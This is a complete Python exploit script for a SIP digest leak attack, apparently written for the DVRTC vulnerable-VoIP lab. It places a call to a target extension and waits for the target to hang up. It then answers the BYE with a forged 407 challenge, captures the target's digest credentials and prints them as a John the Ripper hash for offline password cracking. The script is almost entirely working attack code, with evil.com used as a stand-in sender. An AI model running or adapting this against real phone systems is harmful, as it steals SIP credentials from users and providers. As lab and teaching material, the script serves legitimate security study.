#!/usr/bin/env python3
"""Exploit the DVRTC digest leak path and print the captured SIP digest hash."""

import argparse
import socket
import random
import hashlib
import ipaddress
import re
import sys
import time


def generate_call_id():
    return f"digestleak-{random.randint(100000, 999999)}@attacker"


def generate_branch():
    return f"z9hG4bK-{random.randint(100000, 999999)}"


def generate_tag():
    return f"attacker-{random.randint(100000, 999999)}"


def normalize_host(host):
    if host.startswith("[") and host.endswith("]"):
        return host[1:-1]
    return host


def is_ipv6_literal(host):
    try:
        return ipaddress.ip_address(normalize_host(host)).version == 6
    except ValueError:
        return False


def format_uri_host(host):
    host = normalize_host(host)
    if is_ipv6_literal(host):
        return f"[{host}]"
    return host


def format_hostport(host, port):
    return f"{format_uri_host(host)}:{port}"


def resolve_target(host, port, family=0):
    infos = socket.getaddrinfo(normalize_host(host), port, family=family, type=socket.SOCK_DGRAM)
    if not infos:
        raise OSError(f"could not resolve {host}:{port}")
    return infos[0]


def bind_address_for_family(family, port):
    if family == socket.AF_INET6:
        return ("::", port, 0, 0)
    return ("0.0.0.0", port)


def local_ip_for_target(host, port):
    af, _, proto, _, sockaddr = resolve_target(host, port)
    probe = socket.socket(af, socket.SOCK_DGRAM, proto)
    try:
        probe.connect(sockaddr)
        ip = probe.getsockname()[0]
        if ip:
            return ip
    finally:
        probe.close()

    if af == socket.AF_INET6:
        fallback = ("2606:4700::1", 80, 0, 0)
    else:
        fallback = ("8.8.8.8", 80)
    probe = socket.socket(af, socket.SOCK_DGRAM)
    try:
        probe.connect(fallback)
        return probe.getsockname()[0]
    finally:
        probe.close()


def advertised_ip_for_target(host, port):
    normalized = normalize_host(host)
    try:
        ip = ipaddress.ip_address(normalized)
    except ValueError:
        if normalized.lower() == "localhost":
            return local_ip_for_target("2606:4700::1" if ":" in normalized else "8.8.8.8", 80)
        return local_ip_for_target(host, port)

    if ip.is_loopback:
        if ip.version == 6:
            return local_ip_for_target("2606:4700::1", 80)
        return local_ip_for_target("8.8.8.8", 80)
    return local_ip_for_target(host, port)


def parse_sip_response(data):
    """Parse SIP response and extract key fields."""
    lines = data.decode('utf-8', errors='ignore').split('\r\n')
    result = {
        'status_line': lines[0] if lines else '',
        'status_code': 0,
        'headers': {},
        'body': ''
    }

    # Parse status code
    if lines and lines[0].startswith('SIP/2.0'):
        parts = lines[0].split(' ', 2)
        if len(parts) >= 2:
            try:
                result['status_code'] = int(parts[1])
            except ValueError:
                pass

    # Check if it's a request (like BYE)
    if lines and not lines[0].startswith('SIP/2.0'):
        result['is_request'] = True
        result['method'] = lines[0].split(' ')[0] if lines else ''

    # Parse headers - special handling for Via headers (can have multiple)
    in_body = False
    body_lines = []
    via_headers = []
    for line in lines[1:]:
        if not in_body:
            if line == '':
                in_body = True
            elif ':' in line:
                key, value = line.split(':', 1)
                key_lower = key.strip().lower()
                # Collect all Via headers for proper SIP response routing
                if key_lower == 'via':
                    via_headers.append(value.strip())
                result['headers'][key_lower] = value.strip()
        else:
            body_lines.append(line)

    # Store all Via headers as a list and also as combined string for responses
    result['via_headers'] = via_headers
    result['all_via'] = '\r\nVia: '.join(via_headers) if via_headers else ''

    result['body'] = '\r\n'.join(body_lines)
    return result


def uri_to_john_parts(uri):
    if ":" in uri:
        scheme, remainder = uri.split(":", 1)
    else:
        scheme, remainder = "sip", uri

    if ";" in remainder:
        addr_part, tail_params = remainder.split(";", 1)
    else:
        addr_part, tail_params = remainder, ""

    user_host = addr_part
    port = ""
    host_part = user_host.split("@", 1)[-1] if "@" in user_host else user_host

    if host_part.startswith("["):
        bracket_end = host_part.find("]")
        if bracket_end != -1:
            suffix = host_part[bracket_end + 1:]
            if suffix.startswith(":") and suffix[1:].isdigit():
                port = suffix[1:]
                host_part = host_part[: bracket_end + 1]
                user_prefix = user_host[: -len(user_host.split("@", 1)[-1])] if "@" in user_host else ""
                user_host = f"{user_prefix}{host_part}"
    elif ":" in host_part:
        left, right = host_part.rsplit(":", 1)
        if right.isdigit():
            port = right
            host_part = left
            user_prefix = user_host[: -len(user_host.split("@", 1)[-1])] if "@" in user_host else ""
            user_host = f"{user_prefix}{host_part}"

    params = ""
    if port and tail_params:
        params = f"{port};{tail_params}"
    elif port:
        params = port
    elif tail_params:
        params = tail_params

    host_part = user_host.split("@", 1)[-1] if "@" in user_host else user_host
    return scheme, user_host, params, normalize_host(host_part)


def digest_to_john_hash(creds, server_host, fallback_client_host):
    uri = creds.get("uri", "")
    scheme, uri_userhost, uri_params, uri_host = uri_to_john_parts(uri)
    client_host = uri_host or normalize_host(fallback_client_host)

    return (
        f"$sip$*{normalize_host(server_host)}*{client_host}*{creds.get('username', '')}*"
        f"{creds.get('realm', '')}*BYE*{scheme}*{uri_userhost}*{uri_params}*"
        f"{creds.get('nonce', '')}*{creds.get('cnonce', '')}*{creds.get('nc', '')}*"
        f"{creds.get('qop', '')}*MD5*{creds.get('response', '')}"
    )


def create_invite(local_ip, local_port, target_ip, target_ext, call_id, from_tag, branch):
    """Create SIP INVITE message."""
    addr_type = "IP6" if is_ipv6_literal(local_ip) else "IP4"
    target_uri_host = format_uri_host(target_ip)
    local_hostport = format_hostport(local_ip, local_port)
    sdp = (
        f"v=0\r\n"
        f"o=- {random.randint(1000000, 9999999)} {random.randint(1000000, 9999999)} IN {addr_type} {local_ip}\r\n"
        f"s=Digest Leak Test\r\n"
        f"c=IN {addr_type} {local_ip}\r\n"
        f"t=0 0\r\n"
        f"m=audio {local_port + 1000} RTP/AVP 0 8\r\n"
        f"a=rtpmap:0 PCMU/8000\r\n"
        f"a=rtpmap:8 PCMA/8000\r\n"
        f"a=sendrecv\r\n"
    )

    invite = f"""INVITE sip:{target_ext}@{target_uri_host} SIP/2.0\r
Via: SIP/2.0/UDP {local_hostport};branch={branch};rport\r
Max-Forwards: 70\r
To: <sip:{target_ext}@{target_uri_host}>\r
From: <sip:attacker@evil.com>;tag={from_tag}\r
Call-ID: {call_id}\r
CSeq: 1 INVITE\r
Contact: <sip:attacker@{local_hostport}>\r
Content-Type: application/sdp\r
Content-Length: {len(sdp)}\r
\r
{sdp}"""
    return invite


def create_407_challenge(call_id, via_header, from_header, to_header, cseq):
    """Create 407 Proxy Authentication Required response to BYE."""
    nonce = hashlib.md5(f"{random.randint(1, 1000000)}:{time.time()}".encode()).hexdigest()

    response = f"""SIP/2.0 407 Proxy Authentication Required\r
Via: {via_header}\r
To: {to_header}\r
From: {from_header}\r
Call-ID: {call_id}\r
CSeq: {cseq} BYE\r
Proxy-Authenticate: Digest realm="attacker.evil", nonce="{nonce}", algorithm=MD5, qop="auth"\r
Content-Length: 0\r
\r
"""
    return response


def create_200_ok_bye(call_id, via_header, from_header, to_header, cseq):
    """Create 200 OK response to BYE."""
    response = f"""SIP/2.0 200 OK\r
Via: {via_header}\r
To: {to_header}\r
From: {from_header}\r
Call-ID: {call_id}\r
CSeq: {cseq} BYE\r
Content-Length: 0\r
\r
"""
    return response


def same_call_id(response, call_id):
    return response['headers'].get('call-id', '') == call_id


def extract_credentials(proxy_auth_header, server_host, fallback_client_host):
    """Extract and display credentials from Proxy-Authorization header."""
    print("\n" + "="*60)
    print("DIGEST LEAK CAPTURED")
    print("="*60)
    print(f"\nCaptured Proxy-Authorization header:\n{proxy_auth_header}")

    # Parse the header
    patterns = {
        'username': r'username="([^"]+)"',
        'realm': r'realm="([^"]+)"',
        'nonce': r'nonce="([^"]+)"',
        'uri': r'uri="([^"]+)"',
        'response': r'response="([^"]+)"',
        'cnonce': r'cnonce="([^"]+)"',
        'nc': r'nc=([0-9a-fA-F]+)',
        'qop': r'qop=([^,\s]+)',
    }

    creds = {}
    for key, pattern in patterns.items():
        match = re.search(pattern, proxy_auth_header)
        if match:
            creds[key] = match.group(1)

    print("\nParsed credentials:")
    for key, value in creds.items():
        print(f"  {key}: {value}")

    print("\n" + "-"*60)
    print("These credentials can be used for offline password cracking!")
    print("The john SIP hash format is:")
    if all(k in creds for k in ['username', 'realm', 'nonce', 'response', 'uri']):
        print(f"\n{digest_to_john_hash(creds, server_host, fallback_client_host)}")
    print("="*60 + "\n")

    return creds


def run_attack(
    target_ip,
    target_ext,
    local_port=None,
    *,
    sip_port=5060,
    invite_timeout=15.0,
    bye_timeout=30.0,
    auth_timeout=20.0,
):
    """Run the digest leak path and print the captured digest material."""

    af, stype, proto, _, target_sockaddr = resolve_target(target_ip, sip_port)
    sock = socket.socket(af, stype, proto)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    if local_port is None:
        local_port = random.randint(20000, 40000)
    sock.bind(bind_address_for_family(af, local_port))
    sock.settimeout(invite_timeout)

    local_ip = advertised_ip_for_target(target_ip, sip_port)

    call_id = generate_call_id()
    from_tag = generate_tag()
    branch = generate_branch()
    to_tag = None
    target_uri_host = format_uri_host(target_ip)

    print(f"[*] Starting digest leak probe against {target_ext}@{target_uri_host}")
    print(f"[*] Local endpoint: {format_hostport(local_ip, local_port)}")
    print(f"[*] Call-ID: {call_id}")

    try:
        # Step 1: Send INVITE
        print(f"\n[1] Sending INVITE to {target_ext}@{target_uri_host}...")
        invite = create_invite(local_ip, local_port, target_ip, target_ext,
                               call_id, from_tag, branch)
        sock.sendto(invite.encode(), target_sockaddr)

        # Step 2: Wait for responses (100, 180, 200)
        print("[2] Waiting for response...")
        contact_uri = None
        record_route = ""
        while True:
            try:
                data, addr = sock.recvfrom(4096)
                response = parse_sip_response(data)
                if response['headers'].get('call-id') and not same_call_id(response, call_id):
                    continue

                if response['status_code'] == 100:
                    print(f"    <- 100 Trying")
                elif response['status_code'] == 180:
                    print(f"    <- 180 Ringing")
                elif response['status_code'] == 200:
                    print(f"    <- 200 OK (call answered!)")
                    # Extract To tag
                    to_header = response['headers'].get('to', '')
                    tag_match = re.search(r'tag=([^;>\s]+)', to_header)
                    if tag_match:
                        to_tag = tag_match.group(1)
                    # Extract Contact for ACK routing
                    contact_header = response['headers'].get('contact', '')
                    contact_uri_match = re.search(r'<([^>]+)>', contact_header)
                    contact_uri = contact_uri_match.group(1) if contact_uri_match else None
                    # Extract Record-Route for route set
                    record_route = response['headers'].get('record-route', '')
                    break
                elif response['status_code'] >= 400:
                    print(f"    <- {response['status_code']} Error: {response['status_line']}")
                    return False
            except socket.timeout:
                print("[!] Timeout waiting for response")
                return False

        # Step 3: Send ACK (must go through route set if Record-Route present)
        print(f"\n[3] Sending ACK...")
        print(f"    [DEBUG] Contact URI: {contact_uri}")
        print(f"    [DEBUG] Record-Route: {record_route}")
        ack_branch = generate_branch()

        # Use Contact URI from 200 OK for the Request-URI
        # and add Route header from Record-Route
        ack_request_uri = contact_uri if contact_uri else f"sip:{target_ext}@{target_uri_host}"

        # Build Route header from Record-Route (reversed for request direction)
        route_header = ""
        if record_route:
            route_header = f"Route: {record_route}\r\n"

        ack = f"""ACK {ack_request_uri} SIP/2.0\r
Via: SIP/2.0/UDP {format_hostport(local_ip, local_port)};branch={ack_branch};rport\r
Max-Forwards: 70\r
{route_header}To: <sip:{target_ext}@{target_uri_host}>;tag={to_tag}\r
From: <sip:attacker@evil.com>;tag={from_tag}\r
Call-ID: {call_id}\r
CSeq: 1 ACK\r
Content-Length: 0\r
\r
"""
        print(f"    [DEBUG] ACK first line: {ack.split(chr(13))[0]}")

        # For loopback targets, sending the ACK directly to Contact keeps
        # baresip's local dialog state intact. For non-local runs (for example
        # host -> VM), route the ACK via the proxy because Contact may point at
        # a VM-local 127.0.0.1 address that is not reachable from the attacker.
        ack_sockaddr = target_sockaddr
        ack_destination = f"{target_uri_host}:{sip_port}"
        target_is_loopback = False
        try:
            target_is_loopback = ipaddress.ip_address(normalize_host(target_ip)).is_loopback
        except ValueError:
            target_is_loopback = False

        if contact_uri:
            contact_match = re.search(r'sip:[^@]+@(\[[^\]]+\]|[^:;>]+)(?::(\d+))?', contact_uri)
            if contact_match:
                contact_host = normalize_host(contact_match.group(1))
                contact_port = int(contact_match.group(2)) if contact_match.group(2) else sip_port
                contact_is_loopback = False
                try:
                    contact_is_loopback = ipaddress.ip_address(contact_host).is_loopback
                except ValueError:
                    pass

                # For local loopback labs, go direct to Contact. For non-local
                # runs with route sets, keep proxy routing even if Contact is 127.0.0.1.
                send_ack_direct = target_is_loopback or not record_route
                if send_ack_direct:
                    _, _, _, _, ack_sockaddr = resolve_target(contact_host, contact_port, family=af)
                    ack_destination = format_hostport(contact_host, contact_port)
                elif contact_is_loopback and record_route:
                    print("    [DEBUG] Keeping proxy ACK path (non-local target + loopback Contact)")

        print(f"    [DEBUG] Sending ACK via {ack_destination}")
        sock.sendto(ack.encode(), ack_sockaddr)

        # Step 4: Wait for BYE from target (baresip auto-quits after 20s)
        print(f"[4] Waiting for BYE from target (may take up to 25 seconds)...")
        bye_received = False
        bye_via = None
        bye_cseq = None
        bye_from_header = None
        bye_to_header = None

        sock.settimeout(bye_timeout)
        while not bye_received:
            try:
                data, addr = sock.recvfrom(4096)
                response = parse_sip_response(data)
                if response['headers'].get('call-id') and not same_call_id(response, call_id):
                    continue
                print(f"    [DEBUG] Received from {addr}: {data[:100]}...")

                # Check if it's a BYE request
                if response.get('is_request') and response.get('method') == 'BYE':
                    print(f"    <- BYE received!")
                    bye_received = True
                    # Use all Via headers for proper response routing through proxy
                    bye_via = response.get('all_via', response['headers'].get('via', ''))
                    print(f"    [DEBUG] Via headers count: {len(response.get('via_headers', []))}")
                    for i, v in enumerate(response.get('via_headers', [])):
                        print(f"    [DEBUG] Via[{i}]: {v}")
                    bye_cseq = response['headers'].get('cseq', '1 BYE').split()[0]

                    bye_from_header = response['headers'].get('from', '')
                    bye_to_header = response['headers'].get('to', '')
                    break
                elif response['status_code'] == 200:
                    # Retransmitted 200 OK, ignore
                    pass
                else:
                    print(f"    <- Received: {response.get('status_line', response.get('method', 'unknown'))}")

            except socket.timeout:
                print("[!] Timeout waiting for BYE")
                return False

        # Step 5: Challenge the BYE with 407
        print(f"\n[5] Sending 407 Proxy Authentication Required (challenging the BYE)...")
        challenge = create_407_challenge(call_id, bye_via, bye_from_header, bye_to_header, bye_cseq)
        sock.sendto(challenge.encode(), addr)

        # Step 6: Wait for authenticated BYE (with credentials!)
        print(f"[6] Waiting for authenticated response (credentials)...")
        sock.settimeout(auth_timeout)

        credentials_received = False
        while not credentials_received:
            try:
                data, addr = sock.recvfrom(4096)
                response = parse_sip_response(data)
                if response['headers'].get('call-id') and not same_call_id(response, call_id):
                    continue

                # Check for Proxy-Authorization header
                proxy_auth = response['headers'].get('proxy-authorization', '')
                if proxy_auth:
                    print(f"    <- Received credentials!")
                    credentials_received = True
                    extract_credentials(proxy_auth, target_ip, local_ip)

                    # Send 200 OK to complete
                    ok_response = create_200_ok_bye(
                        call_id, bye_via, bye_from_header, bye_to_header, bye_cseq
                    )
                    sock.sendto(ok_response.encode(), addr)
                    return True
                elif response.get('is_request') and response.get('method') == 'BYE':
                    # Retransmitted BYE without auth: refresh challenge from this BYE.
                    bye_via = response.get('all_via', response['headers'].get('via', ''))
                    bye_cseq = response['headers'].get('cseq', '1 BYE').split()[0]
                    bye_from_header = response['headers'].get('from', bye_from_header)
                    bye_to_header = response['headers'].get('to', bye_to_header)
                    challenge = create_407_challenge(
                        call_id, bye_via, bye_from_header, bye_to_header, bye_cseq
                    )
                    sock.sendto(challenge.encode(), addr)
                else:
                    print(f"    <- Received: {response.get('status_line', response.get('method', 'unknown'))}")

            except socket.timeout:
                print("[!] Timeout waiting for credentials")
                print("[!] The target may not have responded to the 407 challenge")
                return False

    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
        return False
    finally:
        sock.close()

    return False


def build_parser():
    parser = argparse.ArgumentParser(
        description="Exploit the digest leak path and print a john-compatible SIP hash"
    )
    parser.add_argument("host", nargs="?", default="127.0.0.1")
    parser.add_argument("extension", nargs="?", default="2000")
    parser.add_argument("--local-port", type=int)
    parser.add_argument("--sip-port", type=int, default=5060)
    parser.add_argument(
        "--invite-timeout",
        type=float,
        default=15.0,
        help="Seconds to wait for the initial INVITE transaction",
    )
    parser.add_argument(
        "--bye-timeout",
        type=float,
        default=30.0,
        help="Seconds to wait for the target BYE after the call is answered",
    )
    parser.add_argument(
        "--auth-timeout",
        type=float,
        default=20.0,
        help="Seconds to wait for the authenticated BYE after the 407 challenge",
    )
    return parser


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(sys.argv[1:] if argv is None else argv)

    success = run_attack(
        args.host,
        args.extension,
        local_port=args.local_port,
        sip_port=args.sip_port,
        invite_timeout=args.invite_timeout,
        bye_timeout=args.bye_timeout,
        auth_timeout=args.auth_timeout,
    )

    if success:
        print("[+] Digest leak completed successfully")
        sys.exit(0)
    else:
        print("[-] Digest leak failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
